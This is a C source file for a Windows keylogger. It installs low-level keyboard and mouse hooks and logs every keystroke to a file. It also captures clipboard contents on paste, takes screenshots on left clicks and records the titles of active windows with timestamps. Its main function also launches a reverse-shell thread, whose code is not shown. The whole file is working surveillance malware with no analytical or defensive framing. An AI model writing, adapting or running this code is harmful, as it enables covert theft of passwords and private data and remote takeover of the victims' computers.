#include "winkey.h"
#include "mapkey.h"

#pragma comment(lib, "user32.lib")

HHOOK			keyboardHook;
HHOOK			mouseHook;
HWINEVENTHOOK	windowHook;

LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	FILE* flog = 0;

	if (nCode == HC_ACTION) {
		if (wParam == WM_LBUTTONDOWN) {
			fopen_s(&flog, "winkey.log", "a");
			fprintf_s(flog, "%s", "[LeftClick]");
			fclose(flog);
			DoScreenshot();
		}
		else if (wParam == WM_RBUTTONDOWN) {
			fopen_s(&flog, "winkey.log", "a");
			fprintf_s(flog, "%s", "[RightClick]");
			fclose(flog);
		}
	}
	return CallNextHookEx(mouseHook, nCode, wParam, lParam);
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
	static char shift = 0;
	FILE* flog = 0;

	if (nCode == HC_ACTION && wParam == WM_KEYDOWN && (key->vkCode == VK_LSHIFT || key->vkCode == VK_RSHIFT))
		shift = 1;
	if (nCode == HC_ACTION && wParam == WM_KEYUP && (key->vkCode == VK_LSHIFT || key->vkCode == VK_RSHIFT))
		shift = 0;

	if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
		fopen_s(&flog, "winkey.log", "a");
		fprintf_s(flog, "%s", shift ? _shkey[key->vkCode] : _key[key->vkCode]);
		if (GetKeyState(VK_CONTROL) && key->vkCode == 'V')
			GetClipboard(flog);
		fclose(flog);
	}
	return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

void Wineventproc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject,
	LONG idChild, DWORD idEventThread, DWORD dwmsEventTime)
{
	(void)dwmsEventTime; (void)idEventThread; (void)idChild; (void)idObject; (void)hWinEventHook;
	if (event != EVENT_SYSTEM_FOREGROUND)
		return;
	SYSTEMTIME st;
	int len = GetWindowTextLength(hwnd) + 1;
	char* title = LocalAlloc(LMEM_ZEROINIT, len);
	FILE* flog = 0;

	if (!title) return;
	GetSystemTime(&st);
	GetWindowText(hwnd, title, len);
	if (!*title) return;
	fopen_s(&flog, "winkey.log", "a");
	fprintf_s(flog, "\n[%02d.%02d.%d %02d:%02d:%02d] - %s\n", st.wDay, st.wMonth, st.wYear,
		st.wHour, st.wMinute, st.wSecond, title);
	fclose(flog);

	LocalFree(title);
}

void SignalHandler(int signal)
{
	(void)signal;
	UnhookWindowsHookEx(keyboardHook);
	UnhookWinEvent(windowHook);
}

int		main(void)
{
	MSG msg = { 0 };
	DWORD threadID = 0;

	signal(SIGINT, SignalHandler);
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL,
									LowLevelKeyboardProc, 0, 0);
	mouseHook = SetWindowsHookEx(WH_MOUSE_LL, LowLevelMouseProc, 0, 0);
	windowHook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND,
								EVENT_SYSTEM_FOREGROUND, 0,
								Wineventproc, 0, 0,
								WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
	HANDLE hThread = CreateThread(0, 0, reverse_shell, 0, 0, &threadID);
	CloseHandle(hThread);
	while (GetMessage(&msg, 0, 0, 0));
}
